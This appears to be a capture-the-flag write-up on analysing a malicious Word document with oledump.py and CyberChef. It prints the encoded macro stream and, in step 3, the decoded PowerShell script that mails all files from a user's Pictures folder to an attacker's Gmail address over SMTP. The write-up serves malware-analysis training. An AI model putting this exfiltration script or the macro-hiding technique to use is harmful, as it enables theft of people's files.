# How It Happened


- Cyberchef
- The XOR cipher is commonly used by attackers
- [Oledump](https://blog.didierstevens.com/programs/oledump-py/) is used to analyze OLE (compound file binary format) files
    - OLE files are similar to a zip archive
    - MS office applications .doc, .xls, and .ppt are OLE files, and attackers can use macros to hide scripts inside them
- OLE files have storages, which are folders that contain streams of data or other storages
    - View with `oledump <file>`
        - M letter next to a stream indicates a macro
```
Before we start using oledump.py, let's take a look at some of the useful options for analyzing OLE files. To explore more options, use the -m option.

-A does an ASCII dump similar to option -a, but duplicate lines are removed.

-S dumps strings.

-d produces a raw dump of the stream content. 

-s STREAM NUMBER or --select=STREAM NUMBER allows you to select the stream number to analyze (-s a to select all streams)

-d, --dump - perform a raw dump

-x, --hexdump - perform a hex dump

-a, --asciidump - perform an ascii dump

-S, --strings - perform a strings dump

-v, --vbadecompress - VBA decompression

-s - select stream by number
```

## Exercise
1. Use OLEdump, we find that 12, 13, and 14 are macros
```
C:\Users\Administrator\Desktop\Tools\oledump_V0_0_60>oledump.py ../../Santa_Claus_Naughty_List_2021/Santa_Claus_Naughty_List_2021.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7211 '1Table'
  5:    204592 'Data'
  6:        97 'Macros/GrinchEnterprisesWasHere/\x01CompObj'
  7:       318 'Macros/GrinchEnterprisesWasHere/\x03VBFrame'
  8:      1650 'Macros/GrinchEnterprisesWasHere/f'
  9:        84 'Macros/GrinchEnterprisesWasHere/o'
 10:       580 'Macros/PROJECT'
 11:       140 'Macros/PROJECTwm'
 12: M    1879 'Macros/VBA/GrinchEnterprisesWasHere'
 13: M     987 'Macros/VBA/Module1'
 14: m     924 'Macros/VBA/ThisDocument'
 15:      3501 'Macros/VBA/_VBA_PROJECT'
 16:       921 'Macros/VBA/dir'
 17:      4096 'WordDocument'
```
2. Use `oledump.py -s 8 -S ../../Santa_Claus_Naughty_List_2021/Santa_Claus_Naughty_List_2021.doc` to dump content
```
ahNtWnl0cVNHa25EeREaT0BaYRNBWmFid3RlVkJ0ZVp1Tk9aenRURGhkSxNHa2FZbEobVUdrR1NHa3FPQEoWSUERE1VBdGVWQnRlWkdOT1p6dFRTamR5VUBKYRBATk8TQnQWTWprcUxCe25EentHT0ARGld5cGFwcnVyS2BETEhHe21PQE4WS0F0dhpqSEdaQnQWSUJgFmVBTXFPQE1hWkJ7bU9AWhdabmdqW3JkR1d6dE9Qb05tVUFwamhpa2FLQBBtEEEQaUhzcGl3cmQWE3p0SEh6ERpXQnQWTUdnYRNua0dWakRMSEAREhNAZW1PQE15T0BKYhpqYGlZQXtxVG9OR1d6dE9Qb05tVUFwamhpZBJZeVpiGmpkFk9HWhJVek5TT3oQckR3TnUTb0gSS0J0VFZ3dGVTQWYST0AQbUt5EXZoYEpxWUF7cVRqZxNEd051EG92GkpCTnVJR2BhbHl7clZ3dGVTQWAWd0F7cVRyEVtTeXQWE2hgcXdBe3FUdhF1WkdOdVpvYGISbGdAU2piTGhpa21XR2tiVnF0Fkt6TltPdhBtUGpnE0Rpa3FaR3R2aGBKcVlBe3FUb0htWnl0cU9BTXFTenRbWWpnE0R3TnUQb3YaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gWT0drR1VATldnQE51SHl0FhNCdGVQaGBxEkARdVpBTmVXeXBUSEBkZVlAEEdVQE5yU2BETGhpZBJZeVoWZEBOGldqZxNEak1tS0FNcUtAEGFaeXttT0FNcVl5ZHVQQnt5T0BNT2J5ERJLQnRUVnoRGldqRExoaWQSWXlaFnZBWhZheWRyTGpIR1pCdBZJQmAWZUFNcU9ATWFaQnttT0BaF1puZ2pbcmRHV3p0T1BvTm1VQXBqU2BETEhBe21Nb0hpVXlrSBpqT09VR3tqREBraU9AEXVWR2tuREJkZRF5cGFLQE1pU0dOdUhqcGpoYEpxV0ARQFZ2EHVKQk51SUdgYhpqYGlnQmtpU0AQcVd6e25EdRFPWUJkW1NAEHJKYERMSHlOT1B5e24acRF1E292bUxCdFtIcHtxT0FwYkppZHVWR0lTdXYTdXB2ZWlzcUhPbnF1W3JCdG0TR3tpT0ASW2tATk9WehFEWm5nalt7YGpoYEh5VUBOdUt6EURMaWR5U0FkdkRCdBdEaWR5U0FkdVloclMUYEpxS0drcUt6EUtXeXQWE2pnE0RBTnUQb3QaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gSS0J0VFZye3ETenRtTEF0dVZHYGJXcntpTUd0Ek9BTXFuQnttE2pgcU5CdFtPb0h5EkFkW2x6dBJPYEpxV0ARQFZye3ETenRtTEF0dVZHa25WcnRxSGhgcUtHa3FLehFLV3l0FhNockxoRXJMSEAREhNAYBZ3eXQWSGhgcVdAEUBTYEpxS0drcUt6EUtXeXQWE29IcVNAEGFVQBF2TGh3UGhpZBJZeVoWZkJ7bVRBEG1PaGBIFA==
```
3. Decode on cyberchef with base64, then xor with decimal value of 35, then base64 again to get
```
#Credits goes to @ManiarViral (https://twitter.com/maniarviral) for writing this awesome RAT!

$username="Grinch.Enterprises.2021@gmail.com"
$password="S@ntai$comingt0t0wn"
$smtpServer = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage

$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 

$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)


$msg.From = "santaspresentsdelivery@gmail.com"

$msg.To.Add("Grinch.Enterprises.2021@gmail.com")

$msg.Body="Your presents have arrived!"

$msg.Subject = "Christmas Wishlist"

$files=Get-ChildItem "$env:USERPROFILE\Pictures\Grinch2021\"

Foreach($file in $files)
{
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
$attachment.Dispose();
$msg.Dispose();
```
4. Dump the contents of stream 7
```
C:\Users\Administrator\Desktop\Tools\oledump_V0_0_60>oledump.py -s 7 -d ../../Santa_Claus_Naughty_List_2021/Santa_Claus_Naughty_List_2021.doc
VERSION 5.00
Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} GrinchEnterprisesWasHere
   Caption         =   "YouFoundGrinchCookie"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   StartUpPosition =   1  'CenterOwner
   TypeInfoVer     =   4
End
```
5. Go to the directory `"$env:USERPROFILE\Pictures\Grinch2021\"` from the powershell script and find the flag in the png file `S@nt@c1Au$IsrEAl`
